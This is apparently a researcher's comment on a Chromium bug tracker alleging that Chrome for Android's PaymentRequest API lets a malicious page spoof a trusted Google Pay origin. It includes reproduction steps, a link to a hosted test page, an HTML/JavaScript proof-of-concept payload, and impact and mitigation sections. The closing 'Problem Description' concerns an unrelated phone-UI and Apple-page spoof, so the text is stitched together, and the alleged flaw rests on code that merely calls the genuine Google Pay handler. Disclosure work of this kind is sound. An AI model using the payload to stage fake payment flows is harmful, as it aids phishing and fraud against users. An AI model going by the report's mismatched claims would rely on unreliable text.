<p>Hey than for update, I have testing it again today on google pixel android phone using new script and here is details</p>
<p><strong>Description:</strong>
A vulnerability exists in Chrome for Android (version 140.0.7339.123 on Android 15, build V2427) where a malicious site can abuse the PaymentRequest API to spoof a trusted payment origin such as <a href="https://google.com/pay" data-b-widget="url" data-b-original-href="https://google.com/pay" data-b-redirected-href="https://www.google.com/url?q=https://google.com/pay&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3lCNJW7HCgO95I5gtA7mtg">https://google.com/pay</a>.
By crafting a PaymentRequest object with a supportedMethods value pointing to a trusted domain, the browser displays a UI that appears as though the request originates from that domain. This allows attackers to trick users into believing they are interacting with a legitimate payment flow, while in reality, the request is controlled by the attacker’s page.</p>
<p><strong>Step to reproduce :</strong></p>
<p>1.Open the google chrome (latest version) on pixel device.</p>
<p>2.Now open the this link <a href="https://1.hackeronce.com/assets/40095317.html" data-b-widget="url" data-b-original-href="https://1.hackeronce.com/assets/40095317.html" data-b-redirected-href="https://www.google.com/url?q=https://1.hackeronce.com/assets/40095317.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3-9EfX5E1JeJ3Vyb0lhnXF">https://1.hackeronce.com/assets/40095317.html</a></p>
<p>3.Click on any where as it&#39;s showing</p>
<p>4.Navigate to gpay and card have been added automatically and ready for payment.</p>
<p><strong>Proof of Concept (PoC):</strong></p>
<pre><code>  &lt;div&gt;Click somewhere...&lt;/div&gt;
&lt;/head&gt;
&lt;script&gt;
  window.onclick = function() {
    var supportedInstruments = [{
      supportedMethods: &#39;https://google.com/pay&#39;,
      data: {
        &#39;environment&#39;: &#39;TEST&#39;,
        &#39;apiVersion&#39;: 1,
        &#39;allowedPaymentMethods&#39;: [&#39;CARD&#39;, &#39;TOKENIZED_CARD&#39;],
        &#39;paymentMethodTokenizationParameters&#39;: {
          &#39;tokenizationType&#39;: &#39;PAYMENT_GATEWAY&#39;,
          &#39;parameters&#39;: {}
        },
        &#39;cardRequirements&#39;: {
          &#39;allowedCardNetworks&#39;: [&#39;AMEX&#39;,&#39;DISCOVER&#39;,&#39;MASTERCARD&#39;,&#39;VISA&#39;],
          &#39;billingAddressRequired&#39;: true,
          &#39;billingAddressFormat&#39;: &#39;MIN&#39;
        },
        &#39;phoneNumberRequired&#39;: true,
        &#39;emailRequired&#39;: true,
        &#39;shippingAddressRequired&#39;: true
      },
    }];
    var details = {
      total: { label: &#39;Total&#39;, amount: { currency: &#39;USD&#39;, value: &#39;55.00&#39; } }
    };
    var options = {};
    var request = new PaymentRequest(supportedInstruments, details, options);
    request.show();
  }
&lt;/script&gt;
</code></pre>
<p><strong>Impact:</strong></p>
<ul>
<li>
<p>Phishing / Fraud: Attackers can present a spoofed Google Pay (or any trusted PSP) payment UI to trick users into providing sensitive payment details.</p>
</li>
<li>
<p>Brand Misuse: Trusted brands’ payment flows can be impersonated, damaging user trust.</p>
</li>
<li>
<p>Financial Theft: Users may be misled into authorizing fraudulent transactions.</p>
</li>
<li>
<p>Wider Exploitation: Other payment handlers or third-party payment providers could also be spoofed in the same way.</p>
</li>
</ul>
<p><strong>Affected Version(s):</strong></p>
<p>Confirmed on Chrome 140.0.7339.123 (Android 15, build V2427).
Likely affects other Chromium-based browsers on Android and possibly desktop.</p>
<p><strong>Mitigation:</strong></p>
<ol>
<li>
<p>Strict Origin Validation: Chrome should enforce that only pre-registered, verified payment handlers (e.g., Google Pay, Samsung Pay) can appear in supportedMethods. Arbitrary URLs must not be allowed.</p>
</li>
<li>
<p>UI Hardening: Ensure the Payment UI explicitly shows the origin of the requesting site in addition to the payment handler.</p>
</li>
<li>
<p>Deprecation of arbitrary HTTPS strings: Replace with a whitelist or a secure registration model.
User Education: Display clear warnings if the payment request is initiated by an unknown/unverified origin.</p>
</li>
<li>
<p>Patch Rollout: Fix should be backported to stable and extended to all Chromium forks.</p>
</li>
</ol>
<p><strong>Severity:</strong>
High — allows phishing and financial fraud with a spoofed trusted brand UI.</p>

<h1>Steps to reproduce the problem</h1>

<h1>Problem Description</h1>
<p>This bug has a similar concept with <a href="https://crbug.com/chromium/1005596" data-b-widget="url" data-b-original-href="https://crbug.com/chromium/1005596" data-b-redirected-href="https://www.google.com/url?q=https://crbug.com/chromium/1005596&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1Lx76z-b0rxarCOXIKA4bi">https://crbug.com/chromium/1005596</a>: <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1005596" data-b-widget="url" data-b-original-href="https://bugs.chromium.org/p/chromium/issues/detail?id=1005596" data-b-redirected-href="https://www.google.com/url?q=https://bugs.chromium.org/p/chromium/issues/detail?id%3D1005596&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3HYL52Pf5Trr5l0EdrQfxX">https://bugs.chromium.org/p/chromium/issues/detail?id=1005596</a>
However, contrast to Mac, Android calls an native phone UI instead of dialog.
When back to Android Chrome app, normal Contacting Apple web page is loaded, thus the victim would think the number is legit.</p>
